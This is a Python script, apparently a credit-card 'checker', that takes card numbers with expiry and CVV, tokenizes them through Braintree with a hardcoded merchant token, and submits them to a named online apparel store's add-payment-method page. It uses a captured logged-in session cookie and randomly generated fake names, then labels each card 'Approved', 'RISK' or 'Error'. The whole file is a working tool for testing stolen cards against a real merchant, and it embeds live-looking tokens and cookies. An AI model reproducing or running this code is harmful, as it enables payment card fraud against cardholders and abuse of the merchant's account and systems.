def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	
	def generate_random_code(length=32):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
	
	corr = generate_random_code()
	
	sess = generate_random_code()

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAzODgzMDQsImp0aSI6IjYzNjEzZmNlLTVkM2QtNDllZC1hYzRjLTExZjI4MDIxYjA3ZiIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicmVsZW50bGVzc2RlZmVuZGVyYXBwYXJlbF9pbnN0YW50In19.93S2x_DAM-KJkNgooAZeRuLnIrahmaA1hqSzv5enbjFm9HM8hb-snYpHUBe2v1_d0GhzJ3cjv2-Nts9LqLIEhQ',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '3d02daa1-6166-45de-854e-06107640dcbe',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)	

	tok = response.json()['data']['tokenizeCreditCard']['token']


	import requests

	cookies = {
    'cf_clearance': 'GP2eFsAKqA0yoEUZ0G1iWX1pPAVGC0brlA8SfLywc8A-1720301878-1.0.1.1-4uuNRJ5gZ6VvwBnoOfDStwmk75LX6z0OqGffo7ubXgOmvrSKAciNa3YHmM63AtJta_GbmCG3kid6NRje.Frdjg',
    'l7euahzp': 'nzmc2gtk5761',
    '5y4395rb': '8f9dl4rpfwqz',
    'g2u0cqio': 'yjbw5a946jn1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-06%2021%3A38%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DJjZuBjjO5bn1cWkHb5klbbgrvhouQrQvSDQbaCbUEz8-1720301878-0.0.1.1-3646',
    'sbjs_first_add': 'fd%3D2024-07-06%2021%3A38%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DJjZuBjjO5bn1cWkHb5klbbgrvhouQrQvSDQbaCbUEz8-1720301878-0.0.1.1-3646',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1720301890037.35769626231363527',
    '_tt_enable_cookie': '1',
    '_ttp': 'Eq30c8SFubTfZZavU11eWuRjRqF',
    'emotiveio': 'JS-1522-1940834615',
    'wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61': 'yousefahmed1v%7C1721511503%7C2miMgjQ3HUghVEyewdVRD0wPDQhE6BZTeyHpryAhTyD%7Cec6e118edcd3cb0d2a8feccfaea34bf49d4c1eeecea79a5600c7e6a01c4e8a6c',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F',
    '__kla_id': 'eyJjaWQiOiJZV1l4TkRWaU9XUXRORFEwWXkwME16Y3pMVGt3TnpVdFpUUTFNekF6WldSall6Z3kiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjAzMDE4OTAsInZhbHVlIjoiaHR0cHM6Ly9yZWxlbnRsZXNzZGVmZW5kZXIuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kP19fY2ZfY2hsX3RrPUpqWnVCampPNWJuMWNXa0hiNWtsYmJncnZob3VRclF2U0RRYmFDYlVFejgtMTcyMDMwMTg3OC0wLjAuMS4xLTM2NDYiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly9yZWxlbnRsZXNzZGVmZW5kZXIuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcyMDMwMTkzOCwidmFsdWUiOiJodHRwczovL3JlbGVudGxlc3NkZWZlbmRlci5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2Q/X19jZl9jaGxfdGs9SmpadUJqak81Ym4xY1drSGI1a2xiYmdydmhvdVFyUXZTRFFiYUNiVUV6OC0xNzIwMzAxODc4LTAuMC4xLjEtMzY0NiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3JlbGVudGxlc3NkZWZlbmRlci5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6ImRYcVkxWmRkTnZ1eEZlM0JDWG9SbG9jMnB3eUR3NWlacVF6WG8wRWY5bEEuU1BNVVRhIn0=',
}

	headers = {
    'authority': 'relentlessdefender.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cf_clearance=GP2eFsAKqA0yoEUZ0G1iWX1pPAVGC0brlA8SfLywc8A-1720301878-1.0.1.1-4uuNRJ5gZ6VvwBnoOfDStwmk75LX6z0OqGffo7ubXgOmvrSKAciNa3YHmM63AtJta_GbmCG3kid6NRje.Frdjg; l7euahzp=nzmc2gtk5761; 5y4395rb=8f9dl4rpfwqz; g2u0cqio=yjbw5a946jn1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-06%2021%3A38%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DJjZuBjjO5bn1cWkHb5klbbgrvhouQrQvSDQbaCbUEz8-1720301878-0.0.1.1-3646; sbjs_first_add=fd%3D2024-07-06%2021%3A38%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DJjZuBjjO5bn1cWkHb5klbbgrvhouQrQvSDQbaCbUEz8-1720301878-0.0.1.1-3646; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1720301890037.35769626231363527; _tt_enable_cookie=1; _ttp=Eq30c8SFubTfZZavU11eWuRjRqF; emotiveio=JS-1522-1940834615; wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61=yousefahmed1v%7C1721511503%7C2miMgjQ3HUghVEyewdVRD0wPDQhE6BZTeyHpryAhTyD%7Cec6e118edcd3cb0d2a8feccfaea34bf49d4c1eeecea79a5600c7e6a01c4e8a6c; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F; __kla_id=eyJjaWQiOiJZV1l4TkRWaU9XUXRORFEwWXkwME16Y3pMVGt3TnpVdFpUUTFNekF6WldSall6Z3kiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjAzMDE4OTAsInZhbHVlIjoiaHR0cHM6Ly9yZWxlbnRsZXNzZGVmZW5kZXIuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kP19fY2ZfY2hsX3RrPUpqWnVCampPNWJuMWNXa0hiNWtsYmJncnZob3VRclF2U0RRYmFDYlVFejgtMTcyMDMwMTg3OC0wLjAuMS4xLTM2NDYiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly9yZWxlbnRsZXNzZGVmZW5kZXIuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcyMDMwMTkzOCwidmFsdWUiOiJodHRwczovL3JlbGVudGxlc3NkZWZlbmRlci5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2Q/X19jZl9jaGxfdGs9SmpadUJqak81Ym4xY1drSGI1a2xiYmdydmhvdVFyUXZTRFFiYUNiVUV6OC0xNzIwMzAxODc4LTAuMC4xLjEtMzY0NiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3JlbGVudGxlc3NkZWZlbmRlci5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRleGNoYW5nZV9pZCI6ImRYcVkxWmRkTnZ1eEZlM0JDWG9SbG9jMnB3eUR3NWlacVF6WG8wRWY5bEEuU1BNVVRhIn0=',
    'origin': 'https://relentlessdefender.com',
    'pragma': 'no-cache',
    'referer': 'https://relentlessdefender.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"124.0.6327.4"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"JSN-L22"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"9.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/qzn7b59zzrq7gn39/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/qzn7b59zzrq7gn39"},"merchantId":"qzn7b59zzrq7gn39","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Visa","MasterCard","Discover","JCB","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Relentless Defender Apparel","clientId":"ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"relentlessdefenderapparel_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '923a187282',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://relentlessdefender.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	

	
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result